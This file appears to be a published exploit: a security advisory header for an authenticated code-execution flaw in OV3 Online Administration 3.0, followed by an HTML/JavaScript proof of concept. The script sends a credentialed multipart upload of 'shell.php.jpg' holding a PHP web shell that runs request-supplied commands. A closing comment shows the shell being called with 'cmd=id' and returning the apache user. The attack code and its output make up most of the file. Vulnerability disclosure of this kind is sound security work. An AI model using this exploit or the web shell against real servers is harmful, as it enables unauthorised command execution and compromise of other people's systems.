@@ -1,0 +1,165 @@
+<!--
+
+OV3 Online Administration 3.0 Authenticated Code Execution
+
+
+Vendor: novaCapta Software & Consulting GmbH
+Product web page: http://www.meacon.de
+Affected version: 3.0
+
+Summary: With the decision to use the OV3 as a platform for your data management,
+the course is set for scalable, flexible and high-performance applications. Whether
+you use the OV3 for your internal data management or use it for commercial business
+applications such as shops, portals, etc. Thanks to the data-based structure of the
+OV3, you always have the best tool at your fingertips. The OV3 is a 100% web-based
+tool. This eliminates the need to install a new software on all participating client
+computers. All elements are operated by a standard browser. Further advantages are
+the location-dependent use and - particularly with ASP solutions - the reduced costs
+for local hardware like own servers and modern client workstations.
+
+Desc: The application suffers from an authenticated arbitrary code execution. The
+vulnerability is caused due to the improper verification of uploaded files in 'image_editor.php'
+script thru the 'userfile' POST parameter. This can be exploited to execute arbitrary
+PHP code by uploading a malicious PHP script file that will be stored in '/media/customers/'
+directory. There is an extension check when uploading images and if the uploaded file
+does not have the .jpg or .png extension, the application uploads the file with .safety
+extension, which still executes PHP code. The attacker only needs the sid parameter
+value which is disclosed within the initial GET request while authenticating and can be
+collected in MitM attack.
+
+Tested on: CentOS release 6.8 (Final)
+           PHP/5.3.3
+           Apache/2.2.15
+           MySQL/5.0.11
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2017-5411
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2017-5411.php
+
+
+26.12.2016
+
+-->
+
+
+<html>
+  <body>
+  <script>history.pushState('', '', '/')</script>
+    <script>
+      function submitRequest()
+      {
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", "http:\/\/127.0.0.1\/ov3.php?todo=manager&manager=media&sub=insert&edit_id=0&&from=&sid=c7cd370ec516d273230944a2c6495d38&stamp=1234567890&lang=en", true);
+        xhr.setRequestHeader("Content-Type", "multipart\/form-data; boundary=----WebKitFormBoundary5HeURJ9AF8oOlc8q");
+        xhr.setRequestHeader("Accept", "text\/html,application\/xhtml+xml,application\/xml;q=0.9,image\/webp,*\/*;q=0.8");
+        xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.8");
+        xhr.withCredentials = true;
+        var body = "------WebKitFormBoundary5HeURJ9AF8oOlc8q\r\n" + 
+          "Content-Disposition: form-data; name=\"save_close\"\r\n" + 
+          "\r\n" + 
+          "0\r\n" + 
+          "------WebKitFormBoundary5HeURJ9AF8oOlc8q\r\n" + 
+          "Content-Disposition: form-data; name=\"window_key\"\r\n" + 
+          "\r\n" + 
+          "1482761612\r\n" + 
+          "------WebKitFormBoundary5HeURJ9AF8oOlc8q\r\n" + 
+          "Content-Disposition: form-data; name=\"in[user]\"\r\n" + 
+          "\r\n" + 
+          "1483825\r\n" + 
+          "------WebKitFormBoundary5HeURJ9AF8oOlc8q\r\n" + 
+          "Content-Disposition: form-data; name=\"in[group]\"\r\n" + 
+          "\r\n" + 
+          "1095422\r\n" + 
+          "------WebKitFormBoundary5HeURJ9AF8oOlc8q\r\n" + 
+          "Content-Disposition: form-data; name=\"in[description]\"\r\n" + 
+          "\r\n" + 
+          "ZSL\r\n" + 
+          "------WebKitFormBoundary5HeURJ9AF8oOlc8q\r\n" + 
+          "Content-Disposition: form-data; name=\"in[alttext]\"\r\n" + 
+          "\r\n" + 
+          "\r\n" + 
+          "------WebKitFormBoundary5HeURJ9AF8oOlc8q\r\n" + 
+          "Content-Disposition: form-data; name=\"in[subline]\"\r\n" + 
+          "\r\n" + 
+          "\r\n" + 
+          "------WebKitFormBoundary5HeURJ9AF8oOlc8q\r\n" + 
+          "Content-Disposition: form-data; name=\"file_type\"\r\n" + 
+          "\r\n" + 
+          "upload\r\n" + 
+          "------WebKitFormBoundary5HeURJ9AF8oOlc8q\r\n" + 
+          "Content-Disposition: form-data; name=\"MAX_FILE_SIZE\"\r\n" + 
+          "\r\n" + 
+          "122914560\r\n" + 
+          "------WebKitFormBoundary5HeURJ9AF8oOlc8q\r\n" + 
+          "Content-Disposition: form-data; name=\"userfile\"; filename=\"shell.php.jpg\"\r\n" + 
+          "Content-Type: image/webp\r\n" + 
+          "\r\n" + 
+          "\x3c?php system($_REQUEST[\'cmd\']); ?\x3e\r\n" + 
+          "------WebKitFormBoundary5HeURJ9AF8oOlc8q\r\n" + 
+          "Content-Disposition: form-data; name=\"in[author]\"\r\n" + 
+          "\r\n" + 
+          "\r\n" + 
+          "------WebKitFormBoundary5HeURJ9AF8oOlc8q\r\n" + 
+          "Content-Disposition: form-data; name=\"in[copyright]\"\r\n" + 
+          "\r\n" + 
+          "\r\n" + 
+          "------WebKitFormBoundary5HeURJ9AF8oOlc8q\r\n" + 
+          "Content-Disposition: form-data; name=\"in[license_confirm]\"\r\n" + 
+          "\r\n" + 
+          "1\r\n" + 
+          "------WebKitFormBoundary5HeURJ9AF8oOlc8q\r\n" + 
+          "Content-Disposition: form-data; name=\"in_12_1\"\r\n" + 
+          "\r\n" + 
+          "1\r\n" + 
+          "------WebKitFormBoundary5HeURJ9AF8oOlc8q\r\n" + 
+          "Content-Disposition: form-data; name=\"in[license_expires]\"\r\n" + 
+          "\r\n" + 
+          "license_expires\r\n" + 
+          "------WebKitFormBoundary5HeURJ9AF8oOlc8q\r\n" + 
+          "Content-Disposition: form-data; name=\"in[license_expires_0]\"\r\n" + 
+          "\r\n" + 
+          "\r\n" + 
+          "------WebKitFormBoundary5HeURJ9AF8oOlc8q\r\n" + 
+          "Content-Disposition: form-data; name=\"in[license_expires_1]\"\r\n" + 
+          "\r\n" + 
+          "\r\n" + 
+          "------WebKitFormBoundary5HeURJ9AF8oOlc8q\r\n" + 
+          "Content-Disposition: form-data; name=\"in[license_expires_2]\"\r\n" + 
+          "\r\n" + 
+          "\r\n" + 
+          "------WebKitFormBoundary5HeURJ9AF8oOlc8q\r\n" + 
+          "Content-Disposition: form-data; name=\"in[license_remind]\"\r\n" + 
+          "\r\n" + 
+          "0\r\n" + 
+          "------WebKitFormBoundary5HeURJ9AF8oOlc8q\r\n" + 
+          "Content-Disposition: form-data; name=\"in[scheme_id_selected]\"\r\n" + 
+          "\r\n" + 
+          "\r\n" + 
+          "------WebKitFormBoundary5HeURJ9AF8oOlc8q\r\n" + 
+          "Content-Disposition: form-data; name=\"in[scheme_id]\"\r\n" + 
+          "\r\n" + 
+          "\r\n" + 
+          "------WebKitFormBoundary5HeURJ9AF8oOlc8q--\r\n";
+        var aBody = new Uint8Array(body.length);
+        for (var i = 0; i < aBody.length; i++)
+          aBody[i] = body.charCodeAt(i); 
+        xhr.send(new Blob([aBody]));
+      }
+    </script>
+    <form action="#">
+      <input type="button" value="Write file" onclick="submitRequest();" />
+    </form>
+  </body>
+</html>
+
+<!--
+
+GET http://127.0.0.1/media/customers/5575/shell.php.jpg?cmd=id HTTP/1.1
+
+uid=48(apache) gid=48(apache) groups=48(apache)
+
+-->
